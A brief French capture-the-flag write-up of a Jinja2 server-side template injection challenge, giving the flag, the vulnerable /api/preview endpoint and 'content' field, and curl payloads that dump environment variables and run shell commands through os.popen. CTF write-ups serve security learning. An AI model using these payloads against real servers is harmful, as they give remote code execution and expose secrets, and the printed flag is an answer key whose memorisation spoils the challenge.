# boazak--ando-rapports (web / SSTI Jinja2, id 720)

**Flag (finale) :** `NCTF{91fe189a8a46192487746070}`

## Contexte
Portail de rapports ANDO. Endpoints : /documents, /submit, /api/templates, **/api/preview**.
/submit échappe l'input (pas de SSTI). Le rendu vulnérable est /api/preview.

## Faille
`POST /api/preview` (JSON) rend le champ **`content`** via Jinja2 `render_template_string`.
```
POST /api/preview  {"content":"{{7*7}}"}  ->  {"rendered":"49"}
```

## Exploitation (flag en env)
```bash
curl -s $INSTANCE/api/preview -H 'Content-Type: application/json' \
  -d '{"content":"{{lipsum.__globals__.os.environ}}"}'          # dump env -> FLAG
# ou RCE :
  -d '{"content":"{{cycler.__init__.__globals__.os.popen(\"env|grep -i flag\").read()}}"}'
```

## Notes
- Le bon paramètre est `content` (pas `template`/`body`/`text` → "rendered":"").
- `{{config}}` vide (pas de contexte request/Flask dans le render_template_string).
- Payloads sans contexte : `lipsum.__globals__`, `cycler.__init__.__globals__`.
